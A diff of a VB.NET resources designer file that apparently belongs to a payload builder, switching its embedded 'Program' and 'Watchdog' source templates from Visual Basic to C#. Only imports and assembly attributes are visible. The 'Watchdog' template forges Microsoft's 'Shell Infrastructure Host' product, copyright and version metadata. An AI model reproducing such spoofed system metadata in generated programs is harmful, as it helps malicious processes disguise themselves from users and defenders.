@@ -91,25 +91,24 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to Imports System.Security.Cryptography
-        '''Imports Microsoft.Win32
-        '''Imports System.Management
-        '''Imports System
-        '''Imports System.Net.Sockets
-        '''Imports Microsoft.VisualBasic
-        '''Imports System.Diagnostics
-        '''Imports System.Reflection
-        '''Imports System.Runtime.InteropServices
-        '''Imports System.Collections.Generic
-        '''Imports System.Drawing
-        '''Imports System.Windows.Forms
-        '''Imports System.IO
-        '''Imports System.IO.Compression
-        '''Imports System.Net
-        '''Imports System.Drawing.Drawing2D
-        '''Imports System.Drawing.Imaging
-        '''Imports System.Threading
-        ''' [rest of string was truncated]&quot;;.
+        '''  Looks up a localized string similar to using System;
+        '''using System.Diagnostics;
+        '''using System.IO;
+        '''using System.IO.Compression;
+        '''using System.Management;
+        '''using System.Reflection;
+        '''using System.Runtime.InteropServices;
+        '''using System.Security.Cryptography;
+        '''using System.Text;
+        '''using System.Threading;
+        '''using Microsoft.Win32;
+        '''
+        '''#if DefAssembly
+        '''[assembly: AssemblyTitle(&quot;%Title%&quot;)]
+        '''[assembly: AssemblyDescription(&quot;%Description%&quot;)]
+        '''[assembly: AssemblyCompany(&quot;%Company%&quot;)]
+        '''[assembly: AssemblyProduct(&quot;%Product%&quot;)]
+        '''[assembly: AssemblyCopyright(&quot;%Cop [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Program() As String
             Get
@@ -128,26 +127,20 @@ Namespace My.Resources
         End Property
         
         '''<summary>
-        '''  Looks up a localized string similar to Imports System.Security.Cryptography
-        '''Imports Microsoft.Win32
-        '''Imports System.Management
-        '''Imports System
-        '''Imports System.Net.Sockets
-        '''Imports Microsoft.VisualBasic
-        '''Imports System.Diagnostics
-        '''Imports System.Reflection
-        '''Imports System.Runtime.InteropServices
-        '''Imports System.Collections.Generic
-        '''Imports System.Drawing
-        '''Imports System.Windows.Forms
-        '''Imports System.Net
-        '''Imports System.Drawing.Drawing2D
-        '''Imports System.Drawing.Imaging
-        '''Imports System.Threading
-        '''Imports System.Security
-        '''Imports System.Text
+        '''  Looks up a localized string similar to using System;
+        '''using System.Diagnostics;
+        '''using System.IO;
+        '''using System.Management;
+        '''using System.Reflection;
+        '''using System.Security.Cryptography;
+        '''using System.Text;
+        '''using System.Threading;
         '''
-        '''&lt;A [rest of string was truncated]&quot;;.
+        '''[assembly: AssemblyTitle(&quot;Shell Infrastructure Host&quot;)]
+        '''[assembly: AssemblyDescription(&quot;Shell Infrastructure Host&quot;)]
+        '''[assembly: AssemblyProduct(&quot;Microsoft® Windows® Operating System&quot;)]
+        '''[assembly: AssemblyCopyright(&quot;© Microsoft Corporation. All Rights Reserved.&quot;)]
+        '''[assembly: AssemblyFileVersion(&quot;10.0.19041.746&quot;)] [rest of string was truncated]&quot;;.
         '''</summary>
         Friend ReadOnly Property Watchdog() As String
             Get
